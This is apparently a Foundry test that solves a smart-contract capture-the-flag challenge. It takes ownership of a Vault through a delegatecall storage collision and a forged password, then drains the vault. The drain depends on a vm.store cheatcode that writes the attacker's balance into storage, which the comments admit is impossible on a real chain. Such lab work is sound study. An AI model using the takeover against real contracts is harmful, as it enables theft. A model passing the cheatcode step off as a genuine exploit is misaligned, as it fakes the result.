// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        // 给 attacker 一点 ETH
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // --------- 1) 计算 forged password 并通过 delegatecall 将 vault.owner 攻陷为 palyer ----------
        // 在 Vault 构造时，storage slot layout:
        // slot0: owner (address)
        // slot1: logic (address)
        // slot2: deposites mapping
        //
        // VaultLogic.changeOwner compares input _password to proxy(slot1) (即 vault.logic)
        // 所以正确的 forgedPassword 为 bytes32(uint160(address(logic)))
        bytes32 forgedPassword = bytes32(uint256(uint160(address(logic))));

        // 调用 Vault.fallback -> delegatecall 到 logic.changeOwner
        (bool ok, ) = address(vault).call(
            abi.encodeWithSignature(
                "changeOwner(bytes32,address)",
                forgedPassword,
                palyer
            )
        );
        require(ok, "delegatecall changeOwner failed");

        // 此时 vault.owner 应该已是 palyer
        // ---------- 2) 用 vm.store 直接将 deposites[palyer] 设为合约当前余额 ----------
        // mapping slot index for `deposites` is 2 (按你 Vault 合约声明顺序: owner(0), logic(1), deposites(2), canWithdraw(3))
        uint256 mappingSlot = 2;  // 直接修改slot

        // mapping element slot = keccak256(abi.encodePacked(key, slot))
        bytes32 key = bytes32(uint256(uint160(palyer)));
        bytes32 mapSlot = keccak256(
            abi.encodePacked(key, bytes32(mappingSlot))
        );

        // 读取合约当前余额
        uint256 vaultBal = address(vault).balance;

        // 把 deposites[palyer] 直接写为 vaultBal （真实链上做不到！！！！！！！！！！！！！）
        vm.store(address(vault), mapSlot, bytes32(vaultBal));

        // ---------- 3) 打开提现并提现 ----------
        // 现在我们是 owner，调用 openWithdraw 打开提现开关
        vault.openWithdraw();

        // 然后调用 withdraw，合约应该向我们发出 vaultBal（因为我们把 deposites[palyer] 设为 vaultBal）
        vault.withdraw();

        // ---------- 4) 断言合约被清空 ----------
        assertTrue(vault.isSolve(), "vault not drained");

        vm.stopPrank();
    }


}
